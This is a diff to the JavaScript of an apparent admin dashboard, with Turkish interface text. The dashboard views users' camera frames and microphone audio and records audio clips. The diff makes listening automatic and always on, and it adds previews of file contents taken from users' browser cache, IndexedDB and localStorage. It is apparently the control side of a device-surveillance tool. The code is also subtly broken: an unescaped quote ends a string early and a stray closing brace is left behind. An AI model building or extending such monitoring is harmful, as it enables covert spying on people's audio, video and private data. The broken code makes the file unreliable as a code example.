@@ -191,9 +191,9 @@ function renderUserDetail(container, data) {
                 </div>
                 <div id="adminAudioLevel" style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Ses bekleniyor...</div>
                 <div class="audio-controls">
-                    <button class="btn btn-secondary btn-sm" onclick="startAudioListening()">🔊 Dinle</button>
+                    <span class="live-indicator live" style="margin:0;"><span class="dot"></span> Otomatik dinleme aktif</span>
                     <button class="btn btn-secondary btn-sm" onclick="recordAudioClip()">⏺️ Ses Kaydı Al</button>
-                    <button class="btn btn-secondary btn-sm" onclick="sendAudioToUser()">📤 Ses Gönder</button>
+                    <button class="btn btn-secondary btn-sm" onclick="sendAudioToUser()">📤 Ses Gönder (Admin→Kullanıcı)</button>
                 </div>
                 <div id="audioStatus" style="font-size:11px;color:var(--text-muted);margin-top:8px;"></div>
             </div>
@@ -291,7 +291,7 @@ function updateCameraView(camData) {
     const isLive = document.querySelector('.detail-tab[data-tab="camera"]')?.classList.contains('active');
     if (!isLive) return;
 
-    view.innerHTML = `<img src="data:image/jpeg;base64,${camData.frame}" alt="Kamera" style="width:100%;">`;
+    view.innerHTML = `<img src="data:image/jpeg;base64,${camData.frame}" alt="Kamera">`;
 }
 
 function startCameraStream() {
@@ -386,8 +386,7 @@ function updateAudioView(audioData) {
 
 async function startAudioListening() {
     const status = document.getElementById('audioStatus');
-    status.textContent = '🔊 Ses dinleniyor... (2sn gecikmeli)';
-    setTimeout(() => { status.textContent = '✅ Ses dinleme aktif'; }, 2000);
+    if (status) status.textContent = '✅ Otomatik dinleme zaten aktif';
 }
 
 async function recordAudioClip() {
@@ -402,8 +401,8 @@ async function recordAudioClip() {
         const clip = data.relay?.audio?.clip;
         if (clip) {
             const a = document.createElement('a');
-            a.href = `data:audio/wav;base64,${clip}`;
-            a.download = `ses_kaydi_${Date.now()}.wav`;
+            a.href = `data:audio/webm;base64,${clip}`;
+            a.download = `ses_kaydi_${Date.now()}.webm`;
             a.click();
             status.textContent = '✅ Ses kaydı indirildi';
         } else {
@@ -528,24 +527,31 @@ function updateStorageView(storData) {
         });
         const sourceLabels = { cache: '📦 Tarayıcı Önbelleği', serviceworker: '⚙️ Service Worker',
             indexeddb: '🗄️ IndexedDB', localstorage: '📋 localStorage', unknown: '📁 Diğer' };
-        let treeHtml = '<h4 style="font-size:13px;margin-bottom:8px;">📂 Kullanıcı Tarayıcı Verileri</h4>';
-        Object.entries(groups).forEach(([src, files]) => {
-            treeHtml += `<details class="file-group" ${files.length <= 10 ? 'open' : ''}>
+        let treeHtml = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">' +
+            '<h4 style="font-size:13px;">📂 Kullanıcı Tarayıcı Verileri</h4>' +
+            '<span style="font-size:11px;color:var(--text-muted);">30sn'da bir güncellenir</span></div>';
+        Object.entries(groups).forEach(([src, flist]) => {
+            treeHtml += `<details class="file-group" ${flist.length <= 10 ? 'open' : ''}>
                 <summary style="cursor:pointer;padding:6px 0;font-size:13px;font-weight:600;color:var(--text-muted);">
-                    ${sourceLabels[src] || '📁 ' + src} (${files.length})
+                    ${sourceLabels[src] || '📁 ' + src} (${flist.length})
                 </summary>`;
-            files.slice(0, 50).forEach(f => {
+            flist.slice(0, 50).forEach((f, idx) => {
                 const fname = f.name || f.filename || 'dosya';
                 const fsize = f.size ? formatFileSize(f.size) : '';
                 const displayName = fname.length > 80 ? fname.slice(0, 77) + '...' : fname;
-                treeHtml += `<div class="file-item">
+                const hasContent = f.content && f.content.length > 0;
+                const cid = `fc_${src}_${idx}`.replace(/[^a-zA-Z0-9_]/g, '_');
+                const preview = hasContent ? f.content.slice(0, 300) : '';
+                treeHtml += `<div class="file-item" ${hasContent ? `onclick="toggleFileContent('${cid}')" style="cursor:pointer;"` : ''}>
                     <span class="file-icon">${getFileIcon(fname)}</span>
                     <span class="file-name" title="${fname.replace(/"/g, '&quot;')}">${displayName}</span>
                     <span class="file-size">${fsize}</span>
-                </div>`;
+                    ${hasContent ? '<span style="font-size:10px;color:var(--accent-cyan);">👁️</span>' : ''}
+                </div>
+                ${hasContent ? `<div id="${cid}" class="file-content" style="display:none;margin:2px 0 6px 28px;padding:8px;background:var(--bg-secondary);border-radius:6px;font-size:11px;font-family:monospace;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow:auto;">${escapeHtml(preview)}</div>` : ''}`;
             });
-            if (files.length > 50) {
-                treeHtml += `<div style="font-size:11px;color:var(--text-muted);padding:4px 0;">+${files.length - 50} daha fazla...</div>`;
+            if (flist.length > 50) {
+                treeHtml += `<div style="font-size:11px;color:var(--text-muted);padding:4px 0;">+${flist.length - 50} daha fazla...</div>`;
             }
             treeHtml += '</details>';
         });
@@ -553,6 +559,16 @@ function updateStorageView(storData) {
     } else {
         filesDiv.innerHTML = '<p style="color:var(--text-muted);font-size:12px;">Henüz dosya yok</p>';
     }
+}
+
+function toggleFileContent(id) {
+    const el = document.getElementById(id);
+    if (el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
+}
+
+function escapeHtml(str) {
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
 }
 
 function getFileIcon(name) {
